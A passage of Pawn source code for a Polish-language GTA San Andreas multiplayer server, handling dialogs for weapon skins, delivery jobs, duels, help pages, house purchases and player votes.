						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {02DCF4}Combat Shotgun | Blue Lightning\n", s);
						if(sk[playerid][18]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {E2A5DC}Combat Shotgun | Candy\n", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {E2A5DC}Combat Shotgun | Candy\n", s);
						if(sk[playerid][19]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {89E878}Combat Shotgun | Alien", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {89E878}Combat Shotgun | Alien", s);
						return ShowPlayerDialog(playerid, DIALOG_SKINS4, DIALOG_STYLE_LIST, ""C_BLUE1"Skiny do broni "C_WHITE"| "C_BLUE1"Combat Shotgun", s, "Wybierz", "Zamknij");
		            }
		            case 6:
		            {
		            	new s[2048];
						if(sk[playerid][20]) format(s, sizeof(s), ""C_WHITE"["C_LOLIVE"+"C_WHITE"] {AF2108}MP5 | Red Ammo\n");
						else format(s, sizeof(s), ""C_WHITE"["C_RED"-"C_WHITE"] {AF2108}MP5 | Red Ammo\n");
						if(sk[playerid][21]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {878787}MP5 | Hard Reset\n", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {878787}MP5 | Hard Reset\n", s);
						if(sk[playerid][22]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {635050}MP5 | Tiger\n", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {635050}MP5 | Tiger\n", s);
						if(sk[playerid][23]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {4D6833}MP5 | Leaf", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {4D6833}MP5 | Leaf", s);
						return ShowPlayerDialog(playerid, DIALOG_SKINS5, DIALOG_STYLE_LIST, ""C_BLUE1"Skiny do broni "C_WHITE"| "C_BLUE1"MP5", s, "Wybierz", "Zamknij");
		            }
		            case 7:
		            {
		            	new s[2048];
						if(sk[playerid][24]) format(s, sizeof(s), ""C_WHITE"["C_LOLIVE"+"C_WHITE"] {4200BF}M4 | Violet\n");
						else format(s, sizeof(s), ""C_WHITE"["C_RED"-"C_WHITE"] {4200BF}M4 | Violet\n");
						if(sk[playerid][25]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {AF2108}M4 | Fire\n", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {AF2108}M4 | Fire\n", s);
						if(sk[playerid][26]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {84C5FF}M4 | Transparent\n", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {84C5FF}M4 | Transparent\n", s);
						if(sk[playerid][27]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {42F4F1}M4 | Cyan Recoil", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {42F4F1}M4 | Cyan Recoil", s);
						return ShowPlayerDialog(playerid, DIALOG_SKINS6, DIALOG_STYLE_LIST, ""C_BLUE1"Skiny do broni "C_WHITE"| "C_BLUE1"M4", s, "Wybierz", "Zamknij");
		            }
		            case 8:
		            {
		            	new s[2048];
						if(sk[playerid][28]) format(s, sizeof(s), ""C_WHITE"["C_LOLIVE"+"C_WHITE"] {F4D742}AK-47 | Gold\n");
						else format(s, sizeof(s), ""C_WHITE"["C_RED"-"C_WHITE"] {F4D742}AK-47 | Gold\n");
						if(sk[playerid][29]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {F402DC}AK-47 | Pink Missile\n", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {F402DC}AK-47 | Pink Missile\n", s);
						if(sk[playerid][30]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {0A2C75}AK-47 | Night\n", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {0A2C75}AK-47 | Night\n", s);
						if(sk[playerid][31]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {94E552}AK-47 | Mound\n", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {94E552}AK-47 | Mound\n", s);
						if(sk[playerid][32]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {8E7C6D}AK-47 | Military", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {8E7C6D}AK-47 | Military", s);
						return ShowPlayerDialog(playerid, DIALOG_SKINS7, DIALOG_STYLE_LIST, ""C_BLUE1"Skiny do broni "C_WHITE"| "C_BLUE1"AK-47", s, "Wybierz", "Zamknij");
		            }
		            case 9:
		            {
		            	new s[2048];
						if(sk[playerid][33]) format(s, sizeof(s), ""C_WHITE"["C_LOLIVE"+"C_WHITE"] {BA0505}Sniper Rifle | Blood\n");
						else format(s, sizeof(s), ""C_WHITE"["C_RED"-"C_WHITE"] {BA0505}Sniper Rifle | Blood\n");
						if(sk[playerid][34]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {E2A5DC}Sniper Rifle | Candy Demon\n", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {E2A5DC}Sniper Rifle | Candy Demon\n", s);
						if(sk[playerid][35]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {FFA42D}Sniper Rifle | Dragon\n", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {FFA42D}Sniper Rifle | Dragon\n", s);
						if(sk[playerid][36]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {2D8AD8}Sniper Rifle | Water\n", s);
						else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {2D8AD8}Sniper Rifle | Water\n", s);
						return ShowPlayerDialog(playerid, DIALOG_SKINS8, DIALOG_STYLE_LIST, ""C_BLUE1"Skiny do broni "C_WHITE"| "C_BLUE1"Sniper Rifle", s, "Wybierz", "Zamknij");
		            }
		            case 10:
		            {
		                SkinM4[playerid] = 0;
		                SkinCombat[playerid] = 0;
		                SkinAK[playerid] = 0;
		                SkinShotgun[playerid] = 0;
		                SkinDE[playerid] = 0;
		                SkinKnife[playerid] = 0;
		                SkinMP5[playerid] = 0;
		                SkinSniper[playerid] = 0;
		                SkinSilenced[playerid] = 0;
		            }
		        }
		    }
		}
		case DIALOG_T1: 
		{
		    if (!response) return 1;
		    if(response)
		    {
				new choosedid, _g[4];

				strmid(_g, inputtext, 0, strfind(inputtext, "."));
				choosedid = strval(_g);

			   	new s[1024], Float:x, Float:y, Float:z;
				m_query("SELECT x, y, z FROM transport WHERE id = %d", choosedid);
				mysql_store_result();
				while(mysql_fetch_row(s, " "))
				{
					sscanf(s, "fff", x, y, z);
                    SpeCP[playerid] = SetPlayerRaceCheckpoint(playerid,1,x,y,z,x,y,z,6);
				}
				mysql_free_result();
				SetPlayerVirtualWorld(playerid, 50);
				DisableRemoteVehicleCollisions(playerid, 1);
				Speveh[playerid] = CreateVehicle(482,2176.2334,1386.5212,10.9534,89.1394, random(200), random(200), 60);
				AddVehicleComponent(Speveh[playerid], 1010);
				SetVehicleNumberPlate(Speveh[playerid], "{6ba7d6}Impreza");
				new Float:km = GetDistanceBetweenPoints3D(2176.2334,1386.5212,10.9534, x, y, z);
				SetVehicleVirtualWorld(Speveh[playerid], 50);
				PutPlayerInVehicle(playerid, Speveh[playerid], 0);
				TogglePlayerControllable(playerid, 0);
				SpeType[playerid] = 1;
				NaSpedycji[playerid] = true;
				SpeZal[playerid] = 0;
				new kmscore = floatround(km, floatround_round) / 100;
				new mn = random(1) + 1;
				SpeScore[playerid] = floatround(kmscore, floatround_round) * mn;
    			SetTimerEx("Zaladunek", 1500, 0, "i", playerid);
            	ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Za³adunek towaru", ""C_BLUE1"Towar jest ³adowany.\nUkoñczono "C_WHITE"0 "C_BLUE1"procent.", "Zamknij", "");
			}
		}
		case DIALOG_T2: 
		{
		    if (!response) return 1;
		    if(response)
		    {
				new choosedid, _g[4];

				strmid(_g, inputtext, 0, strfind(inputtext, "."));
				choosedid = strval(_g);

			   	new s[1024], Float:x, Float:y, Float:z;
				m_query("SELECT x, y, z FROM transport WHERE id = %d", choosedid);
				mysql_store_result();

				while(mysql_fetch_row(s, " "))
				{
					sscanf(s, "fff", x, y, z);
                    SpeCP[playerid] = SetPlayerRaceCheckpoint(playerid,1,x,y,z,x,y,z,6);
				}
				mysql_free_result();
				SetPlayerVirtualWorld(playerid, 50);
				DisableRemoteVehicleCollisions(playerid, 1);
				Speveh[playerid] = CreateVehicle(519,1477.6929,1730.4885,11.7901,179.9580, 1, 1, 60);
				new Float:km = GetDistanceBetweenPoints3D(1477.6929,1730.4885,11.7901, x, y, z);
				SetVehicleVirtualWorld(Speveh[playerid], 50);
				PutPlayerInVehicle(playerid, Speveh[playerid], 0);
				TogglePlayerControllable(playerid, 0);
				SpeType[playerid] = 2;
				NaSpedycji[playerid] = true;
				SpeZal[playerid] = 0;
				new kmscore = floatround(km, floatround_round) / 120;
				new mn = random(2) + 1;
				SpeScore[playerid] = floatround(kmscore, floatround_round) * mn;
				SetTimerEx("Zaladunek", 1500, 0, "i", playerid);
            	ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Za³adunek towaru", ""C_BLUE1"Towar jest ³adowany.\nUkoñczono "C_WHITE"0 "C_BLUE1"procent.", "Zamknij", "");
			}
		}
		case DIALOG_T3: 
		{
		    if (!response) return 1;
		    if(response)
		    {
				new choosedid, _g[4];

				strmid(_g, inputtext, 0, strfind(inputtext, "."));
				choosedid = strval(_g);

			   	new s[1024], Float:x, Float:y, Float:z;
				m_query("SELECT x, y, z FROM transport WHERE id = %d", choosedid);
				mysql_store_result();

				while(mysql_fetch_row(s, " "))
				{
					sscanf(s, "fff", x, y, z);
                    SpeCP[playerid] = SetPlayerRaceCheckpoint(playerid,1,x,y,z,x,y,z,6);
				}
				mysql_free_result();
				SetPlayerVirtualWorld(playerid, 50);
				DisableRemoteVehicleCollisions(playerid, 1);
				Speveh[playerid] = CreateVehicle(487,2211.0562,1408.3590,16.7174,270.7389, 1, 1, 60);
				new Float:km = GetDistanceBetweenPoints3D(2211.0562,1408.3590,16.7174, x, y, z);
				SetVehicleVirtualWorld(Speveh[playerid], 50);
				PutPlayerInVehicle(playerid, Speveh[playerid], 0);
				TogglePlayerControllable(playerid, 0);
				SpeType[playerid] = 3;
				NaSpedycji[playerid] = true;
				SpeZal[playerid] = 0;
				new kmscore = floatround(km, floatround_round) / 100;
				new mn = random(3) + 1;
				SpeScore[playerid] = floatround(kmscore, floatround_round)  * mn;
				SetTimerEx("Zaladunek", 1500, 0, "i", playerid);
            	ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Za³adunek towaru", ""C_BLUE1"Towar jest ³adowany.\nUkoñczono "C_WHITE"0 "C_BLUE1"procent.", "Zamknij", "");
			}
		}
		case DIALOG_T4: 
		{
		    if (!response) return 1;
		    if(response)
		    {
				new choosedid, _g[4];

				strmid(_g, inputtext, 0, strfind(inputtext, "."));
				choosedid = strval(_g);

			   	new s[1024], Float:x, Float:y, Float:z;
				m_query("SELECT x, y, z FROM transport WHERE id = %d", choosedid);
				mysql_store_result();

				while(mysql_fetch_row(s, " "))
				{
					sscanf(s, "fff", x, y, z);
                    SpeCP[playerid] = SetPlayerRaceCheckpoint(playerid,1,x,y,z,x,y,z,6);
				}
				mysql_free_result();
				SetPlayerVirtualWorld(playerid, 50);
				DisableRemoteVehicleCollisions(playerid, 1);
				Speveh[playerid] = CreateVehicle(493,1631.4419,568.3058,0.0812,90.2254, 1, 1, 60);
				new Float:km = GetDistanceBetweenPoints3D(1631.4419,568.3058,0.0812, x, y, z);
				SetVehicleVirtualWorld(Speveh[playerid], 50);
				PutPlayerInVehicle(playerid, Speveh[playerid], 0);
				TogglePlayerControllable(playerid, 0);
				SpeType[playerid] = 4;
				NaSpedycji[playerid] = true;
				SpeZal[playerid] = 0;
				new kmscore = floatround(km, floatround_round) / 90;
				new mn = random(2) + 1;
				SpeScore[playerid] = floatround(kmscore, floatround_round) * mn;
				SetTimerEx("Zaladunek", 1500, 0, "i", playerid);
            	ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""C_BLUE1"Za³adunek towaru", ""C_BLUE1"Towar jest ³adowany.\nUkoñczono "C_WHITE"0 "C_BLUE1"procent.", "Zamknij", "");
			}
		}
		case DIALOG_ACCEPTDUEL:
		{
		    new enemyid = pEnemy[playerid];
		    if(!IsPlayerConnected(enemyid)) return DialogError(playerid, "{FFFF00}Ten gracz wyszed³ z serwera.");
			if(pEnemy[enemyid] != playerid) return DialogError(playerid, "{FFFF00}Ten gracz walczy teraz z kimœ innym.");
		    if(response)
		    {
				if(GetPlayerVirtualWorld(enemyid) || AFK[enemyid]) return DialogError(playerid, "{FFFF00}Ten gracz nie mo¿e rozegraæ w tym momencie pojedynku.");

				ResetPlayerWeapons(playerid);
				ResetPlayerWeapons(enemyid);
		        SetPlayerVirtualWorld(playerid, playerid + 5);
				SetPlayerInterior(playerid, 1);
		        SetPlayerVirtualWorld(enemyid, playerid + 5);
				SetPlayerInterior(enemyid, 1);
		        Loop(slotid, 2)
				{
					GivePlayerWeapon(playerid, soloWeapon[enemyid][slotid], 7999);
			        GivePlayerWeapon(enemyid, soloWeapon[enemyid][slotid], 7999);
				}
		        SetPlayerPos(playerid, 1416.4463, 4.2999, 1000.9219);
		        SetPlayerPos(enemyid, 1361.3903, -46.3515, 1000.9240);
		        SetPlayerHealth(playerid, 100.0); SetPlayerArmour(playerid, 100.0);
		        SetPlayerHealth(enemyid, 100.0); SetPlayerArmour(enemyid, 100.0);
				SetPlayerSpecialAction(playerid, SPECIAL_ACTION_NONE); SetPlayerSpecialAction(enemyid, SPECIAL_ACTION_NONE);

		        TogglePlayerControllable(playerid, 0);
		        TogglePlayerControllable(enemyid, 0);

				Sound(playerid,3211056,0.0,0.0,0.0);
				Sound(enemyid,3211056,0.0,0.0,0.0);

		        pFight[playerid] = true;
				pFight[enemyid] = true;

                SetTimerEx("unfreezePlayer", 4700, 0, "i", playerid);
                SetTimerEx("unfreezePlayer", 4700, 0, "i", enemyid);
				Countdown[playerid] = 5;
				Countdown[enemyid] = 5;
			}
			else
			{
				soloPlayer[playerid][enemyid] = gettime() + 60;
				soloWeapon[enemyid] = {-1, -1};
			    pEnemy[enemyid] = -1;
			    pEnemy[playerid] = -1;
                return DialogError(enemyid, "{FFFF00}Ten gracz odrzuci³ wyzwanie.");
			}
			return 1;
		}
		case DIALOG_HELP:
		{
			if(!response) return 1;
		    if(response)
		    {
				switch(listitem)
				{
				    case 1: return cmd_cmds(playerid, " ");
				    case 0: return cmd_info(playerid, " ");
				    case 2: return cmd_konto(playerid, " ");
				    case 3: return cmd_sklep(playerid, " ");
				    case 4: return cmd_autor(playerid, " ");
				}
			}
			return 1;
		}
		case DIALOG_INFO:
		{
			if(!response) return 1;
		    if(response)
		    {
				switch(listitem)
				{
				    case 0: return cmd_tutorial(playerid, " ");
				    case 1: return sInfo(playerid);
				    case 2: {
				        new tstr[1024];
						format(tstr, sizeof(tstr), ""C_WHITE"Serwer "NAZWA" "C_WHITE"oferuje 10 zabaw g³ównych:\n\n• "C_ORANGE"Wojna gangów (/wg)"C_WHITE"\n• "C_ORANGE"Baseball Battle (/bb)"C_WHITE"\n•");
						format(tstr, sizeof(tstr), "%s "C_ORANGE"Wyœcig (/rc)"C_WHITE"\n• "C_ORANGE"ColoredHay (/ch)"C_WHITE"\n• "C_ORANGE"Random Killing (/rk)"C_WHITE"\n• "C_ORANGE"Splat (/sp)"C_WHITE"\n• "C_ORANGE"Derby (/db)"C_WHITE"\n• "C_ORANGE"GunGame (/gg)"C_WHITE"\n• "C_ORANGE"Heavy Man (/hm)"C_WHITE"\n• "C_ORANGE"Base Destroy (/bd)"C_WHITE"\n\nS¹ dostêpne równie¿ zabawy poboczne.\nZa wygranie zabaw mo¿esz otrzymaæ kasê oraz EXP.", tstr);
                       	return ShowPlayerDialog(playerid, DIALOG_BACKHELP, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"Atrakcje dla graczy", tstr, "Cofnij", "Zamknij"); }
				    case 3: {
				        new tstr[1024];
						format(tstr, sizeof(tstr), ""C_WHITE"Na serwerze "NAZWA" "C_WHITE"mo¿na wyró¿niæ trzy g³ówne waluty: EXP, gotówkê oraz portfel. G³ówn¹ walut¹ jest "C_LOLIVE"EXP"C_WHITE".\nZa gotówkê kupimy inne, dodatkowe rzeczy, typu domy.\nZa z³otówki z portfela mo¿emy kupiæ "C_LOLIVE"EXP "C_WHITE"lub "C_YELLOW"VIPa"C_WHITE".");
                       	return ShowPlayerDialog(playerid, DIALOG_BACKHELP, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"O gospodarce serwera", tstr, "Cofnij", "Zamknij"); }
				    case 4: {
				        new tstr[1024];
						format(tstr, sizeof(tstr), ""C_WHITE"Na serwerze "NAZWA" "C_WHITE"mo¿esz zarabiaæ na kilka sposobów:\n");
						format(tstr, sizeof(tstr), "%s"C_WHITE"- £apanie potworów (Szansa na otrzymanie "C_YELLOW"1 z³"C_WHITE"),\n- Udzia³ w zabawach i eventach,\n- Zabijanie innych graczy,\n- Odwiedzanie ItemParków,\n- Zbieranie klastrów ("C_LOLIVE"/klastry"C_WHITE"),\n- Szukanie znajdziek pozostawionych przez administracjê,\n", tstr);
						format(tstr, sizeof(tstr), "%s"C_WHITE"- Wykonywanie prac ("C_LOLIVE"/praca"C_WHITE"),\n- Wykonywanie wyzwañ na czacie (kody, rozsypanki, równania),\n- Wykonywanie questów,\n- Aktywna gra na serwerze", tstr);
                       	return ShowPlayerDialog(playerid, DIALOG_BACKHELP, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"Sposoby na zarobek", tstr, "Cofnij", "Zamknij"); }
				    case 5: {
				        new tstr[1024];
						format(tstr, sizeof(tstr), ""C_WHITE"Serwer "NAZWA" "C_WHITE"posiada autorski system prywatnych pojazdów.\nPrywatne pojazdy nie znikaj¹ z mapy po wyjœciu w³aœciciela.\nPrywatny pojazd kupisz pod komend¹ "C_LOLIVE"/pv"C_WHITE". Komend¹ t¹ mo¿esz równie¿ nim zarz¹dzaæ.\n");
						format(tstr, sizeof(tstr), "%s"C_WHITE"Prywatne pojazdy wymagaj¹ tankowania. Mo¿esz to uczyniæ kanistrem paliwa z "C_LOLIVE"/is "C_WHITE"lub na stacji benzynowej za pomoc¹ "C_LOLIVE"/tankuj"C_WHITE".", tstr);
                       	return ShowPlayerDialog(playerid, DIALOG_BACKHELP, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"Prywatne pojazdy", tstr, "Cofnij", "Zamknij"); }
				    case 6: {
				        new tstr[1024];
						format(tstr, sizeof(tstr), ""C_WHITE"Serwer "NAZWA" "C_WHITE"oferuje system skinów na bronie. Zazwyczaj polega to na zmianie koloru broni lub dodanie dodatkowego wzoru na broñ.\n");
						format(tstr, sizeof(tstr), "%s"C_WHITE"Skinów na serwerze jest "C_ORANGE"37"C_WHITE". Mo¿na je odblokowywaæ, graj¹c aktywnie na serwerze.\n\nAktualnie posiadane przez Ciebie skiny zobaczysz i za³o¿ysz pod "C_ORANGE"/skins"C_WHITE".", tstr);
                       	return ShowPlayerDialog(playerid, DIALOG_BACKHELP, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"Skiny na bronie", tstr, "Cofnij", "Zamknij"); }
				    case 7: {
				        new tstr[1024];
						format(tstr, sizeof(tstr), ""C_WHITE"Serwer "NAZWA" "C_WHITE"oferuje 7 aren DeathMatch:\n\n• "C_ORANGE"Desert Eagle (/de)"C_WHITE"\n• "C_ORANGE"Lucky Shot (/lk)"C_WHITE"\n•");
						format(tstr, sizeof(tstr), "%s "C_ORANGE"TEC Battlefield (/tb)"C_WHITE"\n• "C_ORANGE"Grenade Arena (/ga)"C_WHITE"\n• "C_ORANGE"Sawn Battle (/sb)"C_WHITE"\n• "C_ORANGE"Shotgun Arena (/sh)"C_WHITE"\n• "C_ORANGE"Sniper Arena (/sn)"C_WHITE"\n• "C_ORANGE"Head Shot (/hs)"C_WHITE"\n\nIloœæ graczy na danej arenie sprawdzisz w prawym dolnym rogu.", tstr);
                       	return ShowPlayerDialog(playerid, DIALOG_BACKHELP, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"Areny", tstr, "Cofnij", "Zamknij"); }
				    case 8: {
				        new tstr[1024];
						format(tstr, sizeof(tstr), ""C_WHITE"Na serwerze "NAZWA" "C_WHITE"mo¿esz wykonywaæ "C_GREEN"questy"C_WHITE". Pojawiaj¹ siê one co jakiœ czas na "C_GREEN"5 "C_WHITE"minut.\nQuest jest identyczny dla ka¿dego. Quest zostaje uznany za wykonany osobie, która jako pierwsza spe³ni warunki jego ukoñczenia.\n\nZa wykonanie questa otrzymujesz "C_GREEN"150 "C_WHITE"EXP.");
                       	return ShowPlayerDialog(playerid, DIALOG_BACKHELP, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"Questy", tstr, "Cofnij", "Zamknij"); }
				    case 9: {
				        new tstr[1024];
						format(tstr, sizeof(tstr), ""C_WHITE"U nas mo¿esz ³apaæ potwory. Do z³apania potwora bêdzie Ci potrzebny przedmiot {FF0400}Catching "C_WHITE"Tool dostêpny z "C_ORANGE"/is"C_WHITE". £apanie potwora mo¿e byæ czasami ciê¿kie.\nNiektóre potwory potrafi¹ zaatakowaæ gracza przy swojej obronie. Wiêkszoœæ natomiast da siê z³apaæ bez ¿adnych obra¿eñ.\nZa z³apanie potwora otrzymasz EXP oraz gotówkê.\n");
						format(tstr, sizeof(tstr), "%s"C_WHITE"Je¿eli ³apiesz potwora, którego typ jest premiowany, otrzymasz wiêcej EXP. Czasem za z³apanie potwora mo¿esz otrzymaæ "C_ORANGE"1 z³"C_WHITE" do wirtualnego portfela.\nZa z³apanie okreœlonej iloœci potworów otrzymasz osi¹gniêcie.", tstr);
                       	return ShowPlayerDialog(playerid, DIALOG_BACKHELP, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"Potwory", tstr, "Cofnij", "Zamknij"); }
				    case 10: {
				        new tstr[1024];
						format(tstr, sizeof(tstr), ""C_WHITE"Na serwerze posiadamy autorski system klanów. Klany posiadaj¹ swoje tereny, tworzone przez ich liderów w trakcie tworzenia klanu.\nLiderów klanu mo¿e byæ dwóch - g³ówny oraz dodatkowy. G³ówny lider mo¿e zarz¹dzaæ ustawieniami klanu i reszt¹ ustawieñ.\n");
						format(tstr, sizeof(tstr), "%s"C_WHITE"Dodatkowy lider mo¿e wyzywaæ inne klany na wojny b¹dŸ dodawaæ nowych cz³onków do klanu. Ka¿dy klan ma swój punkt startowy na terenie swojego klanu.\nWojny klanowe odbywaj¹ siê na zasadzie dojazdu pojazdem "C_BLUE1"Patriot"C_WHITE" klanu atakuj¹cego na teren klanu broni¹cego.\n", tstr);
						format(tstr, sizeof(tstr), "%s"C_WHITE"Klan, który prze¿yje wygrywa wojnê klanów zdobywaj¹c respekt dla swojego klanu.", tstr);
                       	return ShowPlayerDialog(playerid, DIALOG_BACKHELP, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"Klany", tstr, "Cofnij", "Zamknij"); }
				    case 11: {
				        new tstr[1024];
						format(tstr, sizeof(tstr), ""C_WHITE"Na "NAZWA" "C_WHITE"wystêpuje system osi¹gniêæ. Osi¹gniêæ jest kilka, a za zdobycie ich otrzymujesz EXP.\nZa pojedyncze osi¹gniêcie otrzymasz "C_LOLIVE"500 "C_WHITE"EXP.\nAktualny postêp swoich osi¹gniêæ znajdziesz pod komend¹ "C_LOLIVE"/osiagniecia"C_WHITE".");
                       	return ShowPlayerDialog(playerid, DIALOG_BACKHELP, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"Osi¹gniêcia", tstr, "Cofnij", "Zamknij"); }
				  	case 12: {
				        new tstr[1024];
						format(tstr, sizeof(tstr), ""C_WHITE"Serwer "NAZWA" "C_WHITE"posiada autorski system eventów.\nGracz z rang¹ "JUNIOR" "C_WHITE"lub wy¿sz¹ mo¿e tworzyæ 3 typy eventów: Standardowy, Team Deathmatch oraz OX.\n");
						format(tstr, sizeof(tstr), "%s"C_WHITE"Organizator ma do dyspozycji szereg komend umo¿liwiaj¹cych mu zarz¹dzanie eventem oraz nagradzanie graczy za udzia³ w nim.\n\nKomendy eventów s¹ dostêpne pod "C_BLUE1"/cmds"C_WHITE".", tstr);
                       	return ShowPlayerDialog(playerid, DIALOG_BACKHELP, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"System eventów", tstr, "Cofnij", "Zamknij"); }
				    case 13: {
				        new tstr[1024];
						format(tstr, sizeof(tstr), ""C_WHITE"Serwer "NAZWA" "C_WHITE"posiada autorski system przedmiotów.\n");
						format(tstr, sizeof(tstr), "%s"C_WHITE"Ka¿dy przedmiot oferuje inn¹ funkcjonalnoœæ. Wiêkszoœæ przedmiotów mo¿na kupiæ w "C_BLUE1"/is"C_WHITE".\nNa serwerze wystêpuj¹ jednak jeszcze przedmioty, których nie da siê tam zakupiæ.\n\nPanel ekwipunku dostêpny jest pod "C_BLUE1"/eq"C_WHITE".\nZape³nienie ka¿dego slotu mo¿e spowodowaæ blokadê na otrzymywanie kolejnych przedmiotów.", tstr);
                       	return ShowPlayerDialog(playerid, DIALOG_BACKHELP, DIALOG_STYLE_MSGBOX, ""NAZWA" "C_WHITE"» "C_WHITE"System przedmiotów", tstr, "Cofnij", "Zamknij"); }
				    case 14: return cmd_vip(playerid, " ");
				}
			}
			return 1;
		}
		case DIALOG_BACKHELP: {
		    if(!response) return 1;
		    if(response) return cmd_info(playerid, " "); }

		//System domków
		case DIALOG_DOM:
		{
			if(!response) return 1;

			if(PosiadaDomek(playerid) != -1) return SendClientMessage(playerid, RED, "Nie mo¿esz kupiæ domu poniewa¿ posiadasz ju¿ jeden!");
			new id = pData[playerid][PickupHouseID];
			if(!IsPlayerInRangeOfPoint(playerid, 2.0, HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ])) return SendClientMessage(playerid, YELLOW, "Nie jesteœ w pobli¿u ¿adnego domku.");
			if(HouseData[id][Price] > GetPlayerMoney(playerid)) return SendClientMessage(playerid, RED, "INFO: "C_WHITE"Nie masz wystarczaj¹co pieniêdzy aby zakupiæ ten domek.");
			Player[playerid][Cash] -= HouseData[id][Price];
			HouseData[id][pUID] = Player[playerid][ID];
			format(HouseData[id][Owner], MAX_PLAYER_NAME, Player[playerid][Name]);
			format(HouseData[id][hName], 20, "%s", Player[playerid][Name]);
			if(Iter_Contains(FreeHouses, id)) Iter_Remove(FreeHouses, id);
			Player[playerid][House] = HouseData[id][pUID];
			new msgstr[256];
			format(msgstr, sizeof(msgstr), "Prywatny dom zakupiony! Cena: "C_WHITE"%d$", HouseData[id][Price]);
			SendClientMessage(playerid, GREEN, msgstr);
			UpdateHouseLabel(id);
			SaveHouse(id);
			Streamer_SetIntData(STREAMER_TYPE_PICKUP, HouseData[id][HousePickup], E_STREAMER_MODEL_ID, 1272);
			Streamer_SetIntData(STREAMER_TYPE_MAP_ICON, HouseData[id][HouseIcon], E_STREAMER_TYPE, 32);
			SendToHouse(playerid, id);
			OplacDom(id, 3);
			SaveAllData(playerid);
			return 1;
		}
		case DIALOG_VOTE:
		{
			if(!response && strlen(inputtext) < 8 && IsNumeric(inputtext)) return 1;
			VoteTrwa = true;
			new textformat[256];
			format(textformat, sizeof(textformat), ""C_YELLOW"G£OSOWANIE! "C_WHITE"%s", inputtext);
			SendClientMessageToAll(-1, "");
			SendClientMessageToAll(-1, textformat);
			SendClientMessageToAll(-1, ""C_YELLOW"Zag³osuj za pomoc¹ "C_GREEN"/tak "C_YELLOW"lub "C_RED"/nie"C_YELLOW".");
			SendClientMessageToAll(-1, ""C_YELLOW"G³osowanie zakoñczy siê za "C_WHITE"20 "C_YELLOW"sekund.");
			SendClientMessageToAll(-1, "");
			VoteNie = 0;
			VoteTak = 0;
			SetTimer("EndVote", 1000*20, 0);
			Loop(loopid, MAX_PLAYERS) VoteGlosowal[loopid] = false;
			return 1;
		}
		case DIALOG_DOM_1:
		{
			if(!response) return 1;
			new id = ObokDomku(playerid);
			if(id == -1) return SendClientMessage(playerid, YELLOW, "Musisz byæ obok drzwi domu.");
			if(!(1 <= strlen(inputtext) <= MAX_HOUSE_PASSWORD)) return ShowPlayerDialog(playerid, DIALOG_DOM_1, DIALOG_STYLE_INPUT, "Panel domu", ""C_BLUE1"Musisz "C_WHITE"podaæ has³o "C_BLUE1"aby wejœæ do domu", "Dalej", "Anuluj");
